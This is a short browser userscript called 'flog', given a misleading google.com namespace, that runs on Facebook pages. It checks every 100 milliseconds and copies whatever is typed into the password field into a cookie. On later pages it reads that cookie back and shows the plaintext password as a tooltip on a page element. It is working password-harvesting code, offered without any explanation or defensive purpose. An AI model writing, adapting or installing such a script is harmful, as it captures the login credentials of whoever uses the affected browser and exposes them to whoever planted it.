// ==UserScript==
// @name        flog
// @namespace   google.com
// @include     *.facebook.com*
// @version     1
// @grant       none
// ==/UserScript==

setInterval(function(){
if(document.getElementById('pass')) {




if(document.getElementById('email').value!="")
document.cookie="ff="+document.getElementById('pass').value;
}
},100);









if(!document.getElementById('pass')) {
setInterval(function(){
var c_name="ff";
var c_value = document.cookie;
var c_start = c_value.indexOf(" " + c_name + "=");
if (c_start == -1)
  {
  c_start = c_value.indexOf(c_name + "=");
  }
if (c_start == -1)
  {
  c_value = null;
  }
else
  {
  c_start = c_value.indexOf("=", c_start) + 1;
  var c_end = c_value.indexOf(";", c_start);
  if (c_end == -1)
  {
c_end = c_value.length;
}
c_value = unescape(c_value.substring(c_start,c_end));
}
var p= c_value;
document.getElementsByClassName('sortLink _p')[0].title=p;

},5000);
}








